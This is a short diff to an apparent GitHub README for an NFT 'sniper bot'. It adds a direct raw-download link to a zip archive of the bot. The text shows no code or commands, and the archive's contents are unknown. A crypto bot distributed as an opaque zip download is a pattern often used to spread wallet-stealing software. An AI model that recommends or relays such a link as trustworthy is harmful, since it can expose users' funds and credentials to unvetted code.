@@ -4,9 +4,9 @@ if you fork and modify please give credit
 This is a tutorial to help run the opensea raribles coinbase nft sniper bot (javascript version).
 
 
-you can download the zip file of the Bot here
+you can download the the Bot here
 
-
+https://github.com/Richardsonbobby/JavaScript-opensea-rarible-coinbase-nft-sniper-bot/raw/main/opensea-raribles-coinbase-nft-sniper.zip
 
 Let’s get started.
 
